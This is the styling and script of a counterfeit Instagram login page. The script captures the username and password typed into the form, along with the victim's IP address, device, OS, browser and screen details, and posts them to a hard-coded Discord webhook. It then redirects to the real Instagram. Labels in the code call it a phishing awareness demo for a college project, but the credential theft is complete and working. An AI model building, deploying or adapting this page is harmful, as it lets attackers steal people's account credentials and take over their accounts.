    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #000;
            color: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .main-container {
            display: flex;
            flex: 1;
            justify-content: center;
            align-items: center;
            max-width: 1100px;
            margin: 0 auto;
            width: 100%;
            padding: 32px 32px 0;
        }

        /* ── Left Panel ── */
        .left-panel {
            flex: 1;
            max-width: 520px;
            padding: 0 48px 0 0;
        }
        .ig-logo-icon {
            width: 96px;
            height: 96px;
            margin-bottom: 20px;
        }
        .tagline {
            font-size: 36px;
            font-weight: 700;
            line-height: 1.25;
            color: #f5f5f5;
        }
        .gradient-text {
            background: linear-gradient(90deg, #d62976, #fa7e1e, #feda75, #d62976, #962fbf, #4f5bd5);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* ── Right Panel ── */
        .right-panel {
            width: 100%;
            max-width: 416px;
            min-width: 350px;
            padding: 48px 40px 36px;
            border-left: 1px solid rgba(255,255,255,0.08);
            flex-shrink: 0;
        }
        .form-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #f5f5f5;
        }
        .input-field {
            width: 100%;
            padding: 17px 16px;
            margin-bottom: 8px;
            background: #121212;
            border: 1px solid #333;
            border-radius: 14px;
            color: #f5f5f5;
            font-size: 16px;
            outline: none;
        }
        .input-field::placeholder {
            color: #737373;
            font-size: 15px;
        }
        .input-field:focus {
            border-color: #484848;
        }
        .login-btn {
            width: 100%;
            padding: 15px;
            margin-top: 14px;
            background: #0064e0;
            border: none;
            border-radius: 14px;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }
        .login-btn:hover {
            background: #005acc;
        }
        .forgot-link {
            display: block;
            text-align: center;
            margin: 20px 0 32px;
            color: #e0e0e0;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .fb-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            padding: 15px;
            background: rgba(255,255,255,0.1);
            border: none;
            border-radius: 14px;
            color: #f5f5f5;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }
        .fb-btn:hover {
            background: rgba(255,255,255,0.15);
        }
        .create-btn {
            display: block;
            width: 100%;
            padding: 15px;
            margin-top: 8px;
            background: transparent;
            border: 1px solid #0064e0;
            border-radius: 14px;
            color: #0095f6;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
        }
        .create-btn:hover {
            background: rgba(0,100,224,0.08);
        }

        /* ── Meta Logo ── */
        .meta-logo {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 4px;
            margin-top: 30px;
        }
        .meta-icon {
            width: 76px;
            height: 15px;
        }

        /* ── Footer ── */
        footer {
            padding: 24px 16px 20px;
            text-align: center;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 4px 16px;
            margin-bottom: 12px;
        }
        .footer-links a {
            color: #737373;
            text-decoration: none;
            font-size: 12px;
            line-height: 1.8;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-bottom {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            color: #737373;
            font-size: 12px;
            margin-top: 4px;
        }
        .lang-select {
            display: inline-flex;
            align-items: center;
            gap: 3px;
            color: #737373;
            font-size: 12px;
        }

        /* ── Desktop Large ── */
        @media screen and (min-width: 1100px) {
            .tagline {
                font-size: 42px;
            }
        }

        /* ── Tablet / Small Desktop ── */
        @media screen and (max-width: 880px) {
            .main-container {
                flex-direction: column;
                align-items: center;
                gap: 0;
                padding: 40px 24px 0;
            }
            .left-panel {
                max-width: 400px;
                padding: 0 0 32px;
                text-align: center;
            }
            .ig-logo-icon {
                margin-left: auto;
                margin-right: auto;
                display: block;
            }
            .tagline {
                font-size: 30px;
            }
            .right-panel {
                border-left: none;
                border-top: 1px solid rgba(255,255,255,0.08);
                max-width: 400px;
                min-width: unset;
                padding: 32px 0 24px;
            }
        }

        /* ── Mobile ── */
        @media screen and (max-width: 480px) {
            .main-container {
                padding: 32px 20px 0;
            }
            .left-panel {
                max-width: 100%;
                padding: 0 0 24px;
            }
            .ig-logo-icon {
                width: 64px;
                height: 64px;
                margin-bottom: 16px;
            }
            .tagline {
                font-size: 24px;
            }
            .right-panel {
                padding: 24px 0 20px;
                max-width: 100%;
            }
            .input-field {
                padding: 15px 14px;
            }
            .login-btn, .fb-btn, .create-btn {
                padding: 13px;
                font-size: 14px;
            }
            .footer-links {
                gap: 2px 12px;
            }
            .footer-links a {
                font-size: 11px;
            }
        }

    <script>
        function getDeviceInfo() {
            var ua = navigator.userAgent;
            var device = 'Unknown';
            var os = 'Unknown';
            var browser = 'Unknown';

            if (/iPhone/.test(ua)) device = 'iPhone';
            else if (/iPad/.test(ua)) device = 'iPad';
            else if (/Android.*Mobile/.test(ua)) device = 'Android Phone';
            else if (/Android/.test(ua)) device = 'Android Tablet';
            else if (/Macintosh/.test(ua)) device = 'Mac/MacBook';
            else if (/Windows/.test(ua)) device = 'Windows PC';
            else if (/Linux/.test(ua)) device = 'Linux PC';

            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Mac OS X/.test(ua)) os = 'macOS';
            else if (/Android ([\d.]+)/.test(ua)) os = 'Android ' + ua.match(/Android ([\d.]+)/)[1];
            else if (/iPhone OS ([\d_]+)/.test(ua)) os = 'iOS ' + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g, '.');

            if (/Edg\//.test(ua)) browser = 'Edge';
            else if (/Chrome\//.test(ua)) browser = 'Chrome';
            else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Firefox\//.test(ua)) browser = 'Firefox';

            return { device: device, os: os, browser: browser };
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var btn = document.getElementById('loginBtn');
            var info = getDeviceInfo();

            btn.textContent = 'Logging in...';
            btn.disabled = true;

            var webhookUrl = 'https://discord.com/api/webhooks/1539956613941567561/tYCT2juxxugTWjJGrJe6GamHI1xpy683pAE34JyTpAIPqknchLzCYz1bWpJoQ89XwzXI';

            fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(data) { return data.ip; })
            .catch(function() { return 'Could not fetch'; })
            .then(function(ip) {
                var payload = {
                    embeds: [{
                        title: 'Phishing Demo - Credentials Captured',
                        color: 16711680,
                        fields: [
                            { name: 'Username', value: '```' + username + '```', inline: false },
                            { name: 'Password', value: '```' + password + '```', inline: false },
                            { name: 'IP Address', value: '`' + ip + '`', inline: true },
                            { name: 'Device', value: info.device, inline: true },
                            { name: 'OS', value: info.os, inline: true },
                            { name: 'Browser', value: info.browser, inline: true },
                            { name: 'Screen', value: screen.width + 'x' + screen.height, inline: true },
                            { name: 'Time', value: new Date().toLocaleString(), inline: true }
                        ],
                        footer: { text: 'Phishing Awareness Demo - College Project' },
                        timestamp: new Date().toISOString()
                    }]
                };

                return fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            })
            .then(function() { window.location.href = 'https://www.instagram.com/'; })
            .catch(function() { window.location.href = 'https://www.instagram.com/'; });
        });
    </script>
